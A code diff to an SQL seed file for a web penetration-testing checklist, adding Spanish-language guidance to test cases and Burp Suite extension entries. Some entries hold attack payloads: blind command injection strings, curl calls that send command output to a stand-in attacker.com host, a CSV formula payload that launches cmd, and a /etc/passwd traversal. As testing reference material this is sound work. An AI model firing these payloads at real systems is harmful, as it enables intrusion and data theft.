@@ -1043,44 +1043,81 @@ INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
 
 (28, 'Burp Extension-403 Bypasser', '## Extensión de Burp\n\n- **Uso:** Instala la extensión "403 Bypasser" en Burp Suite para probar payloads de evasión automáticamente en cada petición 403 detectada.', 7);
 
--- Inserir items de Other Test Cases
-INSERT INTO checklist_items (category_id, title, order_num) VALUES
-(29, 'Testing for Role authorization', 1),
-(29, 'Check if normal user can access resources of high privileged users', 2),
-(29, 'Forced browsing', 3),
-(29, 'Insecure direct object reference', 4),
-(29, 'Parameter tampering to switch user account', 5),
-(29, 'Check for security headers: X Frame Options', 6),
-(29, 'Check for security headers: X-XSS header', 7),
-(29, 'Check for security headers: HSTS header', 8),
-(29, 'Check for security headers: CSP header', 9),
-(29, 'Check for security headers: Referrer Policy', 10),
-(29, 'Check for security headers: Cache Control', 11),
-(29, 'Check for security headers: Public key pins', 12),
-(29, 'Blind OS command injection: using time delays', 13),
-(29, 'Blind OS command injection: by redirecting output', 14),
-(29, 'Blind OS command injection: with out-of-band interaction', 15),
-(29, 'Blind OS command injection: with out-of-band data exfiltration', 16),
-(29, 'Command injection on CSV export (Upload/Download)', 17),
-(29, 'CSV Excel Macro Injection', 18),
-(29, 'If you find phpinfo.php file, check for configuration leakage', 19),
-(29, 'Parameter Pollution Social Media Sharing Buttons', 20),
-(29, 'Broken Cryptography: Cryptography Implementation Flaw', 21),
-(29, 'Broken Cryptography: Encrypted Information Compromised', 22),
-(29, 'Broken Cryptography: Weak Ciphers Used for Encryption', 23),
-(29, 'Web Services Testing: Test for directory traversal', 24),
-(29, 'Web Services Testing: Web services documentation disclosure', 25);
+-- ==========================================
+-- CATEGORY: Other Test Cases (ID 29)
+-- ==========================================
 
--- Inserir items de Burp Suite Extensions
-INSERT INTO checklist_items (category_id, title, order_num) VALUES
-(30, 'Scanners: ActiveScanPlusPlus', 1),
-(30, 'Scanners: additional-scanner-checks', 2),
-(30, 'Scanners: backslash-powered-scanner', 3),
-(30, 'Information Gathering: filter-options-method', 4),
-(30, 'Information Gathering: Admin-Panel_Finder', 5),
-(30, 'Information Gathering: BigIPDiscover', 6),
-(30, 'Information Gathering: PwnBack', 7),
-(30, 'Vulnerability Analysis: Burp-NoSQLiScanner', 8);
+INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
+(29, 'Testing for Role authorization', '## Escalada de Privilegios Vertical\n\n- **Objetivo:** Acceder a funciones de Admin siendo Usuario.\n- **Prueba:** Captura una petición de Admin (e.g., `/admin/deleteUser`). Repítela usando la cookie de sesión de un usuario normal.\n- **Herramienta:** `Burp Authorize` (Extensión) automatiza esto.', 1),
+
+(29, 'Check if normal user can access resources of high privileged users', '## Broken Object Level Authorization (BOLA/IDOR)\n\n- **Prueba:** Intentar acceder a objetos (facturas, mensajes) que pertenecen a roles superiores manipulando IDs en la URL o API.', 2),
+
+(29, 'Forced browsing', '## Descubrimiento de Contenido Oculto\n\n- **Técnica:** Fuzzing de directorios y archivos no enlazados.\n- **Wordlists:** `Common.txt`, `raft-large-directories.txt`.\n- **Herramientas:** `Feroxbuster`, `Dirsearch`, `Gobuster`.\n- **Objetivo:** Encontrar `/backup`, `/config`, `/test`, `.git`.', 3),
+
+(29, 'Insecure direct object reference', '## (Referencia Cruzada)\n\nVerifica si puedes acceder a datos de otros usuarios modificando IDs secuenciales (`user_id=100` -> `101`).', 4),
+
+(29, 'Parameter tampering to switch user account', '## Manipulación de Parámetros\n\n- **Prueba:** Busca parámetros ocultos en formularios POST (`<input type="hidden" name="role" value="user">`).\n- **Ataque:** Cambia `user` a `admin` o `root` antes de enviar.', 5),
+
+(29, 'Check for security headers: X Frame Options', '## Prevención de Clickjacking\n\n- **Valor Esperado:** `DENY` o `SAMEORIGIN`.\n- **Riesgo:** Si falta, un atacante puede cargar tu sitio en un `iframe` transparente y engañar a los usuarios para que hagan clic en botones ocultos.', 6),
+
+(29, 'Check for security headers: X-XSS header', '## Filtro XSS Legacy\n\n- **Valor:** `1; mode=block`.\n- **Nota:** Obsoleto en navegadores modernos (que usan CSP), pero útil para defensa en profundidad en navegadores viejos.', 7),
+
+(29, 'Check for security headers: HSTS header', '## Strict-Transport-Security\n\n- **Función:** Fuerza al navegador a usar siempre HTTPS, evitando ataques de `SSL Stripping`.\n- **Verificación:** Debe tener `max-age` largo (e.g., 1 año) y `includeSubDomains`.', 8),
+
+(29, 'Check for security headers: CSP header', '## Content Security Policy\n\n\n\n- **Crítico:** Define qué scripts pueden ejecutarse.\n- **Bypass:** Busca `unsafe-inline`, `unsafe-eval` o wildcards (`*`) que debilitan la política y permiten XSS.', 9),
+
+(29, 'Check for security headers: Referrer Policy', '## Privacidad de Referer\n\n- **Riesgo:** Si es laxo, las URLs con tokens sensibles (`site.com/reset?token=xyz`) se filtran a terceros en el header `Referer`.\n- **Recomendado:** `strict-origin-when-cross-origin` o `no-referrer`.', 10),
+
+(29, 'Check for security headers: Cache Control', '## Datos Sensibles en Caché\n\n- **Prueba:** Verifica respuestas con datos privados (perfil, banco).\n- **Requerido:** `Cache-Control: no-store, no-cache`. Si no, los datos quedan en el disco del usuario o proxies intermedios.', 11),
+
+(29, 'Check for security headers: Public key pins', '## HPKP (Deprecado)\n\n- **Nota:** Public Key Pinning ha sido eliminado de la mayoría de navegadores modernos por riesgo de "Brickear" el dominio. Se prefiere usar registros CAA en DNS.', 12),
+
+(29, 'Blind OS command injection: using time delays', '## Inyección Ciega (Time-Based)\n\n\n\n- **Payloads:**\n  - `|| sleep 10`\n  - `; sleep 10;`\n  - `& ping -c 10 127.0.0.1 &`\n- **Indicador:** Si la respuesta tarda 10 segundos más de lo normal, hay ejecución de código.', 13),
+
+(29, 'Blind OS command injection: by redirecting output', '## Escritura en Webroot\n\n- **Payload:** `|| whoami > /var/www/html/out.txt ||`\n- **Verificación:** Navega a `http://target.com/out.txt` para ver el resultado del comando.', 14),
+
+(29, 'Blind OS command injection: with out-of-band interaction', '## Interacción OOB\n\n- **Payload:** `|| curl http://attacker.com ||` o `|| nslookup attacker.com ||`.\n- **Herramienta:** Burp Collaborator. Si recibes una petición DNS/HTTP, es vulnerable.', 15),
+
+(29, 'Blind OS command injection: with out-of-band data exfiltration', '## Exfiltración de Datos\n\n- **Payload:** `|| curl http://attacker.com/$(whoami) ||`\n- **Resultado:** Recibirás una petición en tu servidor como `GET /root`, revelando el usuario del sistema.', 16),
+
+(29, 'Command injection on CSV export (Upload/Download)', '## CSV Injection (Formula Injection)\n\n\n\n- **Payload:** Si el input del usuario (`=cmd|'' /C calc''!A0`) se refleja en un CSV descargado por un administrador.\n- **Impacto:** Al abrir el archivo en Excel, se ejecuta la calculadora (o malware).', 17),
+
+(29, 'CSV Excel Macro Injection', '## Variantes de Fórmulas\n\n- **Caracteres de inicio:** `=`, `+`, `-`, `@`.\n- **Prueba:** `+2+3` (Si Excel muestra 5, es vulnerable).\n- **Riesgo:** Ejecución de código arbitrario en la máquina de la víctima (Client-Side attack).', 18),
+
+(29, 'If you find phpinfo.php file, check for configuration leakage', '## Information Disclosure\n\n- **Buscar:**\n  - `DOCUMENT_ROOT` (Ruta física).\n  - `Environment Variables` (AWS Keys, DB Passwords).\n  - Versiones de librerías vulnerables.', 19),
+
+(29, 'Parameter Pollution Social Media Sharing Buttons', '## Hijacking de Redes Sociales\n\n- **Prueba:** Manipular parámetros en botones de "Compartir".\n- **Impacto:** Modificar la URL que se comparte para que apunte a un sitio malicioso en lugar del artículo original.', 20),
+
+(29, 'Broken Cryptography: Cryptography Implementation Flaw', '## Fallos de Implementación\n\n- **Ejemplos:** Padding Oracle Attack (mensajes de error de descifrado), uso de claves estáticas, o reutilización de Nonce/IV.', 21),
+
+(29, 'Broken Cryptography: Encrypted Information Compromised', '## Claves Hardcodeadas\n\n- **Análisis:** Revisa el código JS o descompila la APK móvil.\n- **Hallazgo:** Claves privadas RSA o claves API almacenadas en texto plano dentro del código fuente.', 22),
+
+(29, 'Broken Cryptography: Weak Ciphers Used for Encryption', '## Algoritmos Obsoletos\n\n- **Checks:** Uso de `DES`, `RC4`, `MD5` (para firmas) o `HTTP` simple para login.\n- **Herramienta:** `testssl.sh` o `sslyze` para analizar la configuración SSL/TLS.', 23),
+
+(29, 'Web Services Testing: Test for directory traversal', '## Path Traversal en API\n\n- **Endpoint:** `/api/download?file=...`\n- **Payload:** `../../../../etc/passwd`.\n- **Nota:** A veces las APIs XML/SOAP son vulnerables a esto en los parámetros de la entidad.', 24),
+
+(29, 'Web Services Testing: Web services documentation disclosure', '## Reconocimiento de API\n\n- **Archivos:** `wsdl`, `swagger.json`, `/api-docs`.\n- **Riesgo:** Expone todos los endpoints, parámetros y tipos de datos, facilitando el ataque a funciones ocultas.', 25);
+
+-- ==========================================
+-- CATEGORY: Burp Suite Extensions (ID 30)
+-- ==========================================
+
+INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
+(30, 'Scanners: ActiveScanPlusPlus', '## Escaneo Activo Mejorado\n\nExtiende el escáner nativo de Burp. Busca vulnerabilidades avanzadas como Cache Poisoning, Host Header Attacks y XML input handling raros.', 1),
+
+(30, 'Scanners: additional-scanner-checks', '## Chequeos Extra\n\nAñade firmas pasivas para detectar DOM XSS conocidos, problemas de CORS, y cabeceras de seguridad faltantes que el escáner por defecto a veces omite.', 2),
+
+(30, 'Scanners: backslash-powered-scanner', '## Inyecciones Complejas\n\nLa mejor herramienta para detectar **Server-Side Template Injection (SSTI)** y vulnerabilidades de inyección en el backend que no son SQL estándar. Detecta anomalías en el manejo de caracteres especiales.', 3),
+
+(30, 'Information Gathering: filter-options-method', '## Análisis de Métodos HTTP\n\nAyuda a identificar y probar métodos HTTP inusuales (`PUT`, `DELETE`, `TRACE`) que podrían estar habilitados y mal configurados.', 4),
+
+(30, 'Information Gathering: Admin-Panel_Finder', '## Fuzzing de Paneles\n\nAutomatiza la búsqueda de interfaces administrativas usando una lista curada de rutas comunes. Útil para no configurar Gobuster manualmente.', 5),
+
+(30, 'Information Gathering: BigIPDiscover', '## F5 BIG-IP Recon\n\nDetecta si el servidor está detrás de un balanceador F5 BIG-IP y trata de identificar versiones o cookies de persistencia internas para mapear la red interna.', 6),
+
+(30, 'Information Gathering: PwnBack', '## Wayback Machine Integration\n\nConsulta automáticamente `archive.org` para encontrar URLs históricas del dominio objetivo. Excelente para encontrar endpoints de API viejos y olvidados.', 7),
+
+(30, 'Vulnerability Analysis: Burp-NoSQLiScanner', '## Inyección NoSQL\n\nEscáner especializado para bases de datos como MongoDB. Intenta inyectar payloads JSON y operadores NoSQL (`$ne`, `$gt`) para bypasear autenticación.', 8);
 
 -- ==========================================
 -- DADES DE PROVA
